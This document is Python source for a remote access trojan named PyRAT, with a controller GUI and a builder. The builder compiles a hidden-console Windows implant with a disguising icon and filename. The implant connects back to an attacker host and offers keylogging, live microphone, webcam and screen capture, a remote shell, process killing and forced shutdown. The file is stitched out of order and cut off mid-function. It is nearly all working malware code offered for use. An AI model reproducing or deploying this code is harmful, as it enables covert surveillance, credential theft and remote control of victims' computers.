                global stream
                stream = True
                threading.Thread(target=share_desktop, args=(client,)).start()

            elif command == "<AUDIO>":
                global rec_audio
                rec_audio = True
                threading.Thread(target=audio, args=(client,)).start()

            elif command == "<SHELL>":
                global local_shell
                local_shell = True
                shell(client)

            elif command == "<STOP_AUDIO>":
                rec_audio = False

            elif command == "<LOG>":
                global Logging
                Logging = True
                threading.Thread(target=log, args=(client,)).start()

            elif command == "<STOP_LOG>":
                Logging = False

            elif command == "<STOP_CAM>":
                cam = False

            elif command == "<STOP_SHARE>":
                stream = False

            elif command == "<END>":
                client.close()
                connected = False
                client = None
                local_shell = False
                connected = False
                cam = False
                stream = False
                Logging = False
                rec_audio = False

            elif command == "<SHUTDOWN>":
                os.system("shutdown /s /t 0")

            elif command == "<RESTART>":
                os.system("shutdown /r /t 0")

            elif command == "<LOCK>":
                os.system("rundll32.exe user32.dll,LockWorkStation")

            elif command == "<KILL>":
                out = subprocess.check_output("tasklist", shell=True).decode(errors="ignore")
                client.sendall(out.encode())
                pass

            elif command == "<KILLED>":
                PID = client.recv(1024).decode()
                out = subprocess.check_output(f"taskkill /F /PID {r"{PID}"}")
                client.send(out)

            else:
                pass

        except subprocess.CalledProcessError:
            client.send("None".encode())

        except ConnectionResetError:
            if client:
                client.close()
            client = None
            connected = False
            time.sleep(3)
            pass

        except AttributeError:
            if client:
                client.close()
            client = None
            connected = False
            time.sleep(3)
            pass

        except UnboundLocalError:
            if client:
                client.close()
            client = None
            connected = False
            time.sleep(3)
            pass


try:
    recv()
except:
    recv()
                """
                if self.build_icon and self.set_icon.get() and self.set_name.get().strip():
                    filename = self.set_name.get().strip()
                    self.Error_Label.configure(text="")
                    self.Build_ip.delete("0", "end")
                    self.Build_port.delete("0", "end")
                    self.set_name.delete("0", "end")
                    self.B_build.configure(text="Building", state="disabled")
                    ready = open("ready.py", "w")
                    ready.write(data)
                    ready.close()
                    subprocess.run(f"python -m nuitka --onefile --windows-console-mode=disable  --windows-icon-from-ico={self.build_icon} --output-filename={filename} ready.py", shell=True)
                    subprocess.run("del ready.py", shell=True)
                    subprocess.run("rmdir /S /Q ready.build", shell=True)
                    subprocess.run("rmdir /S /Q ready.dist", shell=True)
                    subprocess.run("rmdir /S /Q ready.onefile-build", shell=True)
                    self.B_build.configure(text="Build", state="enabled")

                if self.set_name.get().strip() and not self.set_icon.get():
                    filename = self.set_name.get().strip()
                    self.Error_Label.configure(text="")
                    self.Build_ip.delete("0", "end")
                    self.Build_port.delete("0", "end")
                    self.set_name.delete("0", "end")
                    self.B_build.configure(text="Building", state="disabled")
                    ready = open("ready.py", "w")
                    ready.write(data)
                    ready.close()
                    subprocess.run(f"python -m nuitka --onefile --windows-console-mode=disable --output-filename={filename} ready.py", shell=True)
                    subprocess.run("del ready.py", shell=True)
                    subprocess.run("rmdir /S /Q ready.build", shell=True)
                    subprocess.run("rmdir /S /Q ready.dist", shell=True)
                    subprocess.run("rmdir /S /Q ready.onefile-build", shell=True)
                    self.B_build.configure(text="Build", state="enabled")

                elif not self.set_name.get():
                    self.Error_Label.configure("Filename not set!")
                elif self.set_icon.get() and not self.build_icon and self.set_name.get().strip():
                    self.Error_Label.configure("Icon not set!")

            threading.Thread(target=build).start()

        except ValueError:
            self.Error_Label.configure(text="Enter valid port!")
        except ZeroDivisionError:
            self.Error_Label.configure(text="Enter valid ip!")


if __name__ == '__main__':
    try:
        root = CTk()
        PyRAT(root)
        root.mainloop()

    except Exception as e:
        print(e)
        pass
from customtkinter import *
import subprocess
import threading


def requirements():
    subprocess.run("pip install pypiwin32 opencv-python pillow pynput win10toast pyaudio nuitka", shell=True)
    subprocess.run("python -m pip install -U nuitka", shell=True)

threading.Thread(target=requirements).start()

import tkinter as tk
from tkinter import filedialog
import socket
import time
import cv2
import numpy as np
from PIL import Image
from win10toast import ToastNotifier
import pyaudio

IP = "0.0.0.0"
listen = False
server_thread = None


class PyRAT:
    def __init__(self, master):
        self.img = CTkImage(Image.open(".\Snake.ico"), size=(120, 120))

        self.very_big_font = CTkFont(family="Helvetica", size=30, weight="bold")
        self.big_font = CTkFont(family="Helvetica", size=20, weight="bold")
        self.small_font = CTkFont(family="Helvetica", size=9, weight="bold")

        self.root = master
        self.root.title("PyRAT")
        self.root.iconbitmap(".\Snake.ico")
        self.root.geometry("1080x730")
        self.root.resizable(height=False, width=False)
        self.root.configure(fg_color="black")

        nothing = CTkLabel(self.root, text="")
        nothing.place(x=0, y=0)
        # Tabview
        self.Tab = CTkTabview(self.root, width=1000, height=700, segmented_button_selected_color="#438A3B", text_color="lime", segmented_button_unselected_color="black", segmented_button_fg_color="#0A1209", fg_color="#101A10", segmented_button_selected_hover_color="grey")
        self.Tab.pack()

        self.Tab.add("Control Panel")
        self.Tab.add("Builder/Listener")

        # Control_panel
        self.Logo_Label = CTkLabel(self.Tab.tab("Control Panel"), bg_color="#101A10", image=self.img, text="")
        self.Display = CTkTextbox(self.Tab.tab("Control Panel"), width=830, height=640, state="disabled", fg_color="#080C08")
        self.B_info = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Info", text_color="lime", fg_color="black", hover_color="grey", command=self.info)
        self.B_screen = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Screen", text_color="lime", fg_color="black", hover_color="grey", command=self.screen)
        self.B_cam = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Cam", text_color="lime", fg_color="black", hover_color="grey", command=self.cam)
        self.B_audio = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Audio", text_color="lime", fg_color="black", hover_color="grey", command=self.audio)
        self.B_logger = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Logger", text_color="lime", fg_color="black", hover_color="grey", command=self.logger)
        self.B_shell = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Shell", text_color="lime", fg_color="black", hover_color="grey", command=self.toggle_shell)
        self.B_lock = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Lock", text_color="lime", fg_color="black", hover_color="grey", command=self.lock)
        self.B_screenshot = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Screenshot", text_color="lime", fg_color="black", hover_color="grey", command=self.screenshot)
        self.B_snap = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Snap", text_color="lime", fg_color="black", hover_color="grey", command=self.snap)
        self.B_shutdown = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Shutdown", text_color="lime", fg_color="black", hover_color="grey", command=self.shutdown)
        self.B_reset = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Restart", text_color="lime", fg_color="black", hover_color="grey", command=self.restart)
        self.B_kill = CTkButton(self.Tab.tab("Control Panel"), bg_color="#0A1209", text="Kill PID", text_color="lime", fg_color="black", hover_color="grey", command=self.toggle_kill)

        self.Shell_Entry = CTkEntry(self.Tab.tab("Control Panel"), width=140, bg_color="#438A3B", text_color="white", font=self.small_font, state="disabled")
        self.Shell_Label = CTkLabel(self.Tab.tab("Control Panel"), text_color="white", bg_color="#101A10", text="Shell:", font=self.small_font)
        self.Kill_Entry = CTkEntry(self.Tab.tab("Control Panel"), width=140, bg_color="#438A3B", text_color="white", font=self.small_font, state="disabled")
        self.Kill_Label = CTkLabel(self.Tab.tab("Control Panel"), text_color="white", bg_color="#101A10", text="PID:",font=self.small_font)

        self.Shell_Entry.bind("<Return>", self.shell)
        self.Kill_Entry.bind("<Return>", self.killer)

        self.B_info.place(x=0, y=165)
        self.B_screenshot.place(x=0, y=200)
        self.B_screen.place(x=0, y=235)
        self.B_cam.place(x=0, y=270)
        self.B_snap.place(x=0, y=305)
        self.B_audio.place(x=0, y=340)
        self.B_logger.place(x=0, y=375)
        self.B_kill.place(x=0, y=410)
        self.B_shell.place(x=0, y=445)
        self.B_lock.place(x=0, y=480)
        self.B_reset.place(x=0, y=515)
        self.B_shutdown.place(x=0, y=550)

        # Root
        self.Title_Label = CTkLabel(self.Tab.tab("Control Panel"), text_color="lime", text="PyRAT", font=self.very_big_font, bg_color="#101A10")
        self.Connection_Label = CTkLabel(self.root, text_color="lime", bg_color="#101A10", text="", font=self.small_font)
        self.Error_Label = CTkLabel(self.root, text_color="red", bg_color="#101A10", text="", font=self.small_font)

        # Server
        self.Port_Entry = CTkEntry(self.Tab.tab("Builder/Listener"), height=60, width=988, bg_color="#438A3B", text_color="green", font=self.big_font)
        self.Listen_Label = CTkLabel(self.Tab.tab("Builder/Listener"), text_color="lime", bg_color="#101A10", text="", font=self.big_font)
        self.Listen_Label_info = CTkLabel(self.Tab.tab("Builder/Listener"), text_color="white", bg_color="#101A10", text="Port:", font=self.big_font)
        self.Listener_Label = CTkLabel(self.Tab.tab("Builder/Listener"), text_color="lime", bg_color="#101A10", text="PyRAT Listener:", font=self.very_big_font)
        self.B_listen = CTkButton(self.Tab.tab("Builder/Listener"), bg_color="#0A1209", text="Listen", text_color="lime", fg_color="black", hover_color="grey", command=self.switch_listening, width=988, font=self.big_font, height=60)

        # Builder
        self.Build_Label = CTkLabel(self.Tab.tab("Builder/Listener"), text_color="lime", bg_color="#101A10", text="PyRAT Builder:", font=self.very_big_font)
        self.B_build = CTkButton(self.Tab.tab("Builder/Listener"), bg_color="#0A1209", text="Build", text_color="lime", fg_color="black", hover_color="grey", command=self.builder, width=988, font=self.big_font, height=60)
        self.Build_port = CTkEntry(self.Tab.tab("Builder/Listener"), width=988, bg_color="#438A3B", text_color="green", font=self.big_font, height=60)
        self.Build_ip = CTkEntry(self.Tab.tab("Builder/Listener"), width=988, bg_color="#438A3B", text_color="green", font=self.big_font, height=60)
        self.Build_Label_ip = CTkLabel(self.Tab.tab("Builder/Listener"), text_color="white", bg_color="#101A10", text="LHost:", font=self.big_font)
        self.Build_Label_port = CTkLabel(self.Tab.tab("Builder/Listener"), text_color="white", bg_color="#101A10",text="LPort:", font=self.big_font)
        self.tren1 = CTkLabel(self.Tab.tab("Builder/Listener"), text_color="green", bg_color="#101A10", text="~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~", font=self.big_font)
        self.set_icon = CTkCheckBox(self.Tab.tab("Builder/Listener"), offvalue=False, onvalue=True, text="Icon", font=self.big_font, fg_color="green", hover_color="lime", command=self.build_icon_set)
        self.set_name = CTkEntry(self.Tab.tab("Builder/Listener"))
        self.set_name_label = CTkLabel(self.Tab.tab("Builder/Listener"), bg_color="#101A10", text="Filename:", font=self.big_font)
        self.Display.place(x=150, y=4)
        self.build_icon = None

        # Listener
        self.Listener_Label.place(x=0, y=5)
        self.B_listen.place(x=0, y=150)
        self.Port_Entry.place(x=0, y=80)
        self.Listen_Label_info.place(x=0, y=50)
        self.Listen_Label.place(x=0, y=220)

        # Builder
        self.Build_Label.place(x=0, y=285)
        self.tren1.place(x=0, y=250)
        self.B_build.place(x=0, y=580)

        self.set_icon.place(x=260, y=540)
        self.set_name.place(x=110, y=540)
        self.set_name_label.place(x=10, y=540)

        self.Build_Label_ip.place(x=0, y=330)
        self.Build_ip.place(x=0, y=360)
        self.Build_Label_port.place(x=0, y=430)
        self.Build_port.place(x=0, y=460)

        # Dependencies
        self.Error_Label.place(x=830, y=18)
        self.Connection_Label.place(x=920, y=18)
        self.Logo_Label.place(x=10, y=0)
        self.Title_Label.place(x=25, y=125)

        self.server = None
        self.client = None
        self.sharingScreen = False
        self.sharingCam = False
        self.shell_mode = False
        self.sharingAudio = False
        self.showing_png = False
        self.showing_snap = False
        self.killers = False
        self.Logging = False
        self.showing_png = False
        self.size_share = None
        self.width_share = None
        self.height_share = None
        self.size_cam = None
        self.width_cam = None
        self.height_cam = None

    def build_icon_set(self):
        if self.set_icon.get():
            self.build_icon = filedialog.askopenfile(title="Select an Icon File", filetypes=[("Icon Files", "*.ico"), ("PNG Files", "*.png")])
            if self.build_icon:
                self.build_icon = self.build_icon.name.strip()
                self.set_icon.configure(text=f"Icon: {os.path.basename(str(self.build_icon))}")

            else:
                self.Error_Label.configure(text="Icon not set!")
        else:
            self.Error_Label.configure(text="")
            self.set_icon.configure(text="Icon")

    def logger(self):
        def stop_logging():
            try:
                self.client.send("<STOP_LOG>".encode())
                self.clear()
                self.enable()
            except ConnectionAbortedError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass

        def start_logging():
            try:
                self.client.send("<LOG>".encode())
                self.clear()
                self.disable()
                self.B_logger.configure(text="exit", state="normal")
                while self.Logging:
                    key = self.client.recv(1024).decode(errors="ignore")
                    if "<END_LOG>" in key or not key:
                        self.Logging = False
                        break
                    self.Display.configure(state="normal")
                    self.Display.insert(tk.END, f"{key}")
                    self.Display.yview_moveto(1)
                    self.Display.configure(state="disabled")

            except ConnectionResetError:
                self.Logging = False
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.Logging = False
                self.enable()
                self.Connection_Label.configure(text="")
                pass

        if not self.Logging:
            self.Logging = True
            threading.Thread(target=start_logging).start()
        else:
            self.Logging = False
            threading.Thread(target=stop_logging).start()

    def notify(self, title, msg, duration):
        notify = ToastNotifier()
        notify.show_toast(
            title=title,
            msg=msg,
            icon_path=r".\Snake.ico",
            duration=duration
        )

    def snap(self):
        def stop_showing():
            self.clear()
            self.enable()

        def get():
            try:
                self.client.send("<SNAP>".encode())
                state = self.client.recv(4096)
                if state == b"<START>":
                    self.disable()
                    self.B_snap.configure(text="exit", state="enabled")
                    self.clear()
                    img_bytes = b""
                    while True:
                        bytes = self.client.recv(10240)
                        if b"<END>" in bytes:
                            bytes = bytes.replace(b"<END>", b"")
                            img_bytes += bytes
                            break
                        img_bytes += bytes

                    img = np.frombuffer(img_bytes, dtype=np.uint8).reshape((self.width_cam, self.height_cam, 3))
                    image = cv2.resize(img, (920, 600))
                    cv2.imshow("Snap", image)
                    while self.showing_snap:
                        cv2.waitKey(50)
                    cv2.destroyAllWindows()
                    stop_showing()

                elif state == b"<NO_CAM>":
                    self.enable()
                    self.Error_Label.configure(text="No cam found!")

            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass
            except OSError:
                self.enable()
                pass

        if not self.showing_snap:
            self.showing_snap = True
            threading.Thread(target=get).start()
        else:
            self.showing_snap = False
            threading.Thread(target=stop_showing).start()

    def screenshot(self):
        def stop_showing():
            self.clear()
            self.enable()

        def get():
            try:
                self.client.send("<SCREENSHOT>".encode())
                self.disable()
                time.sleep(0.01)
                self.B_screenshot.configure(state="enabled", text="exit")
                img_bytes = b""
                while True:
                    bytes = self.client.recv(4096)
                    if b"<END>" in bytes:
                        bytes = bytes.replace(b"<END>", b"")
                        img_bytes += bytes
                        break
                    img_bytes += bytes

                img_array = np.frombuffer(img_bytes, dtype=np.uint8)
                image = cv2.imdecode(img_array, cv2.IMREAD_COLOR)
                if image is not None:
                    image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)
                    image = cv2.resize(image, (920, 600))
                    cv2.imshow("Screenshot", image)
                    while self.showing_png:
                        cv2.waitKey(50)
                cv2.destroyAllWindows()
                stop_showing()

            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass
            except OSError:
                self.enable()
                pass

        if not self.showing_png:
            self.showing_png = True
            threading.Thread(target=get).start()
        else:
            self.showing_png = False
            threading.Thread(target=stop_showing).start()

    def restart(self):
        try:
            self.client.send("<RESTART>".encode())
            self.Connection_Label.configure(text="")
            if self.client:
                self.client.close()
            self.client = None
        except ConnectionResetError:
            self.Connection_Label.configure(text="")
            self.client = None
            pass
        except AttributeError:
            self.Connection_Label.configure(text="")
            pass

    def shutdown(self):
        try:
            self.client.send("<SHUTDOWN>".encode())
            self.Connection_Label.configure(text="")
            if self.client:
                self.client.close()
            self.client = None
        except ConnectionResetError:
            self.Connection_Label.configure(text="")
            self.client = None
            pass
        except AttributeError:
            self.Connection_Label.configure(text="")
            pass

    def lock(self):
        try:
            self.client.send("<LOCK>".encode())
        except ConnectionResetError:
            self.Connection_Label.configure(text="")
            self.client = None
            pass
        except AttributeError:
            self.Connection_Label.configure(text="")
            pass

    def enable(self):
        self.B_info.configure(state="normal", text="Info")
        self.B_cam.configure(state="normal", text="Cam")
        self.B_logger.configure(state="normal", text="Logger")
        self.B_shell.configure(state="normal", text="Shell")
        self.B_screen.configure(state="normal", text="Screen")
        self.B_audio.configure(state="normal", text="Audio")
        self.B_kill.configure(state="normal", text="Kill PID")
        self.B_snap.configure(state="normal", text="Snap")
        self.B_lock.configure(state="normal", text="Lock")
        self.B_reset.configure(state="normal", text="Restart")
        self.B_shutdown.configure(state="normal", text="Shutdown")
        self.B_screenshot.configure(state="normal", text="Screenshot")
        self.Error_Label.configure(text="")
        self.showing_png = False
        self.showing_snap = False
        self.sharingScreen = False
        self.sharingCam = False
        self.sharingAudio = False

    def disable(self):
        self.B_info.configure(state="disabled")
        self.B_cam.configure(state="disabled")
        self.B_logger.configure(state="disabled")
        self.B_shell.configure(state="disabled")
        self.B_screen.configure(state="disabled")
        self.B_audio.configure(state="disabled")
        self.B_kill.configure(state="disabled")
        self.B_snap.configure(state="disabled")
        self.B_lock.configure(state="disabled")
        self.B_reset.configure(state="disabled")
        self.B_shutdown.configure(state="disabled")
        self.B_screenshot.configure(state="disabled")
        self.Error_Label.configure(text="")

    def killer(self, event):
        try:
            task = self.Kill_Entry.get().strip()
            if task.isdigit():
                self.client.send("<KILLED>".encode())
                self.client.send(task.encode())
                self.Error_Label.configure(text="")
                self.Kill_Entry.delete("0", "end")
                output = self.client.recv(2048).decode(errors="ignore")
                if output == "None":
                    self.Kill_Entry.delete("0", "end")
                    self.Error_Label.configure(text="Enter valid PID!")
                else:
                    self.Error_Label.configure(text="")
                    self.Display.configure(state="normal")
                    self.Display.insert(tk.END, f"\n{output}")
                    self.Display.yview_moveto(1)
                    self.Display.configure(state="disabled")
            else:
                self.Kill_Entry.delete("0", "end")
                self.Error_Label.configure(text="Enter valid PID!")

        except ConnectionResetError:
            self.enable()
            self.Connection_Label.configure(text="")
            self.client = None
            pass
        except AttributeError:
            self.enable()
            self.Connection_Label.configure(text="")
            pass

    def toggle_kill(self):
        try:
            if not self.killers and self.client:
                def start():
                    self.killers = True
                    self.disable()
                    self.clear()
                    self.client.send("<KILL>".encode())
                    out = self.client.recv(20480).decode(errors="ignore")
                    self.Display.configure(state="normal")
                    self.Display.delete("1.0", tk.END)
                    self.Display.insert("1.0", out)
                    self.Display.yview_moveto(1)
                    self.Display.configure(state="disabled")
                    self.Kill_Label.place(x=0, y=580)
                    self.B_kill.configure(state="normal", text="exit")
                    self.Kill_Entry.configure(state="normal")
                    self.Kill_Entry.place(x=0, y=610)

                threading.Thread(target=start).start()

            else:
                def stop():
                    self.killers = False
                    self.Display.delete("1.0", tk.END)
                    self.Kill_Entry.place_forget()
                    self.Kill_Label.place_forget()
                    self.enable()
                    self.clear()
                    self.Kill_Entry.delete("0", "end")
                    self.Kill_Entry.configure(state="readonly")

                threading.Thread(target=stop).start()

        except ConnectionResetError:
            self.enable()
            self.Connection_Label.configure(text="")
            self.client = None
            pass
        except AttributeError:
            self.enable()
            self.Connection_Label.configure(text="")
            pass

    def info(self):
        def getinfo():
            try:
                self.client.send("<INFO>".encode())
                self.disable()
                output = self.client.recv(10240).decode(errors="ignore")
                self.Display.configure(state="normal")
                self.Display.delete("1.0", tk.END)
                self.Display.insert(tk.END, output)
                self.Display.configure(state="disabled")
                self.enable()
            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass

        threading.Thread(target=getinfo).start()

    def audio(self):
        def stop_audio():
            try:
                self.sharingAudio = False
                self.client.send("<STOP_AUDIO>".encode())
                while True:
                    state = self.client.recv(1024)
                    if b"<ENDED>" in state:
                        break
                self.enable()
            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass

        def share():
            try:
                self.client.send("<AUDIO>".encode())
                self.sharingAudio = True
                self.clear()
                rec = pyaudio.PyAudio()
                aud = rec.open(format=pyaudio.paInt16, channels=1, rate=44100, frames_per_buffer=1024, output=True)
                self.disable()
                self.B_audio.configure(text="exit", state="normal")
                while self.sharingAudio:
                    data = self.client.recv(1024)
                    if not data:
                        break
                    aud.write(data)
                self.enable()
                self.client.send("<STOP_AUDIO>".encode())

            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass

        if not self.sharingAudio:
            threading.Thread(target=share).start()
        else:
            threading.Thread(target=stop_audio).start()

    def screen(self):
        def stop_share():
            try:
                self.client.send("<STOP_SHARE>".encode())
                while True:
                    state = self.client.recv(20480)
                    if b"<STOPPED>" in state:
                        break
                self.enable()
            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass

        def share():
            try:
                self.client.send("<SHARE>".encode())
                self.disable()
                self.clear()
                self.B_screen.configure(text="exit", state="normal")
                while self.sharingScreen:
                    data = b""
                    while len(data) < self.size_share:
                        packet = self.client.recv(self.size_share - len(data))
                        if not packet:
                            break
                        data += packet
                    if not data:
                        break

                    img = np.frombuffer(data, dtype=np.uint8).reshape(self.height_share, self.width_share, 3)
                    screenshot = cv2.resize(cv2.cvtColor(img, cv2.COLOR_BGR2RGB), (920, 600))
                    cv2.imshow("Screen", screenshot)
                    cv2.waitKey(1)
                cv2.destroyAllWindows()

            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass

        if not self.sharingScreen:
            self.sharingScreen = True
            threading.Thread(target=share).start()
        else:
            self.sharingScreen = False
            threading.Thread(target=stop_share).start()

    def recv_stats(self):
        def recv_share_stats():
            self.width_share, self.height_share, self.size_share = map(int,
                                                                       self.client.recv(4096).decode().split(','))

        def recv_cam_stats():
            self.width_cam, self.height_cam, self.size_cam = map(int, self.client.recv(4096).decode().split(','))

        self.client.send("<STATS>".encode())
        recv_share_stats()
        recv_cam_stats()

    def cam(self):
        def stop_cam():
            try:
                self.enable()
                self.client.send("<STOP_CAM>".encode())
                while True:
                    state = self.client.recv(20480)
                    if b"<STOPPED>" in state:
                        break

            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass
            except OSError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass

        def share():
            try:
                self.client.send("<CAM>".encode())
                state = self.client.recv(4096)
                if state == b"<START>":
                    self.disable()
                    self.clear()
                    self.B_cam.configure(text="exit", state="normal")
                    while self.sharingCam:
                        data = b""
                        while len(data) < self.size_cam:
                            packet = self.client.recv(self.size_cam - len(data))
                            if not packet:
                                break
                            data += packet
                        if not data:
                            self.sharingCam = False
                            break
                        img = np.frombuffer(data, dtype=np.uint8).reshape((self.width_cam, self.height_cam, 3))
                        image = cv2.resize(img, (920, 600))
                        cv2.imshow("Camera", image)
                        cv2.waitKey(1)

                    cv2.destroyAllWindows()
                elif state == b"<NO_CAM>":
                    self.enable()
                    self.Error_Label.configure(text="No cam found!")

            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass
            except ValueError:
                self.enable()

        if not self.sharingCam:
            self.sharingCam = True
            threading.Thread(target=share).start()
        else:
            self.sharingCam = False
            threading.Thread(target=stop_cam).start()

    def start_server(self, port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.server.bind((str(IP), int(port)))
            self.server.listen()

            while listen:
                self.client, addr = self.server.accept()

                if self.client:
                    if self.client.recv(1024).decode() == "<PyRAT>":
                        self.client.send("<PyRAT>".encode())
                        self.recv_stats()
                        self.Connection_Label.configure(text=f"Connected: {addr[0]}", font=self.small_font)
                        threading.Thread(target=self.notify,
                                         args=("New connection!", f"Connected to {addr[0]}", 1)).start()
                    else:
                        self.client.close()
                        self.client = None
                        self.Connection_Label.configure(text="")

        except:
            pass

    def switch_listening(self):
        global listen
        global server_thread
        listen = not listen
        time.sleep(0.01)

        if listen:
            try:
                port = int(self.Port_Entry.get().strip())

                if port is None or port > 65535:
                    raise ValueError()

                else:
                    self.Error_Label.configure(text="")
                    self.Port_Entry.configure(state="disabled")
                    self.B_listen.configure(text="stop listening")
                    server_thread = threading.Thread(target=self.start_server, args=(port,))
                    server_thread.start()
                    self.Listen_Label.configure(text=f" Listening...")

            except ValueError:
                self.enable()
                self.Error_Label.configure(text="Enter valid port!")
                self.Listen_Label.configure(text="")
                listen = False
                pass
            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                listen = False
                self.Connection_Label.configure(text="")
                pass
        else:
            try:
                self.Connection_Label.configure(text="")
                self.Port_Entry.configure(state="normal")
                self.enable()
                self.size_share = None
                self.width_share = None
                self.height_share = None
                self.size_cam = None
                self.width_cam = None
                self.height_cam = None

                self.B_listen.configure(text="start listening")
                self.Listen_Label.configure(text="")
                self.clear()
                if self.client:
                    self.client.send("<END>".encode())
                self.server.close()
                self.server = None
                if self.client:
                    self.client.close()
                if server_thread and server_thread.is_alive():
                    server_thread.join()

                self.client = None
            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass

    def clear(self):
        self.Display.configure(state="normal")
        self.Display.delete("1.0", tk.END)
        self.Display.configure(state="disabled")

    def shell(self, event):
        def send():
            try:
                if self.client and self.shell_mode:
                    command = self.Shell_Entry.get().strip()

                    if command.lower() == "exit":
                        self.toggle_shell()
                        return

                    elif not command.strip() or command.strip() == "<END_SHELL>":
                        command = "nothing"

                    self.Display.configure(state="normal")
                    self.client.send(command.encode())
                    direct = self.client.recv(2048).decode(errors="ignore")
                    self.Display.insert(tk.END, f"{direct}> {command}\n")
                    self.Display.configure(state="disabled")
                    self.Shell_Entry.delete("0", "end")
                    out = self.client.recv(12288).decode(errors="ignore")
                    self.Display.configure(state="normal")
                    self.Display.insert(tk.END, f"{out}\n\n")
                    self.Display.yview_moveto(1)
                    self.Display.configure(state="disabled")

                else:
                    self.toggle_shell()
            except ConnectionResetError:
                self.enable()
                self.Connection_Label.configure(text="")
                self.client = None
                pass
            except AttributeError:
                self.enable()
                self.Connection_Label.configure(text="")
                pass

        threading.Thread(target=send).start()

    def toggle_shell(self):
        try:
            self.shell_mode = not self.shell_mode
            if self.shell_mode and self.client:
                self.clear()
                self.disable()
                self.Shell_Entry.configure(state="normal")
                self.B_shell.configure(text="exit", state="normal")
                self.Shell_Entry.place(x=0, y=610)
                self.Shell_Label.place(x=0, y=580)
                self.client.send("<SHELL>".encode())
            else:
                self.clear()
                self.enable()
                self.Shell_Entry.place_forget()
                self.Shell_Label.place_forget()
                self.Shell_Entry.delete("0", "end")
                self.Shell_Entry.configure(state="readonly")
                self.client.send("<END_SHELL>".encode())
        except ConnectionResetError:
            self.enable()
            self.Connection_Label.configure(text="")
            self.client = None
            pass
        except AttributeError:
            self.enable()
            self.Connection_Label.configure(text="")
            pass

    def builder(self):
        try:
            ip = self.Build_ip.get().strip()
            port = int(self.Build_port.get().strip())

            if ip is None or len(ip) < 6:
                raise ZeroDivisionError

            elif port is None or port > 65535:
                raise ValueError()

            def build():
                data = f"""
import os
import subprocess
import threading
import socket
import time
import numpy as np
from PIL import ImageGrab
import cv2
from pynput import keyboard
import pyaudio

local_shell = False
connected = False
cam = False
stream = False
times = 0
Logging = False
rec_audio = False


def audio(client):
    global rec_audio
    try:
        rec = pyaudio.PyAudio()
        aud = rec.open(format=pyaudio.paInt16, channels=1, rate=44100, frames_per_buffer=1024, input=True)

        while rec_audio:
            data = aud.read(1024)
            client.sendall(data)

        client.send(b"<ENDED>")

    except ConnectionResetError:
        rec_audio = False
        if client:
            client.close()
        pass

    except OSError:
        rec_audio = False
        pass

    finally:
        if aud.is_active():
            aud.stop_stream()
        aud.close()
        rec.terminate()


def log(client):
    global Logging

    def on_press(key):
        try:
            client.send(key.char.encode())
        except AttributeError:
            special = str(key).replace("Key.", "")
            if special == "space":
                client.send(" ".encode())
            elif special == "tab":
                client.send("    ".encode())
            elif special == "enter":
                client.send("{r"\n"}".encode())
            elif special == "backspace":
                client.send(" <BACKSPACE> ".encode())
            elif special == "caps_lock":
                client.send(" <CAPS_LOCK> ".encode())

        except ConnectionResetError:
            global Logging
            if client:
                client.close()
            Logging = False
            pass

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    while Logging:
        pass

    listener.stop()
    listener.join()
    client.send("<END_LOG>".encode())


def send_stats(client):
    def send_share_stats():
        img = ImageGrab.grab()
        res = img.size
        size = len(np.array(img).tobytes())
        client.send(f"{r"{res[0]},{res[1]},{size}"}".encode())
        img.close()

    def send_cam_stats():
        camera = cv2.VideoCapture(0)
        if camera.isOpened():
            _, frame = camera.read()
            camera.release()
            res = frame.shape
            size = len(frame.tobytes())
            client.send(f"{r"{res[0]},{res[1]},{size}"}".encode())
        else:
            client.send("0,0,0".encode())
        camera.release()

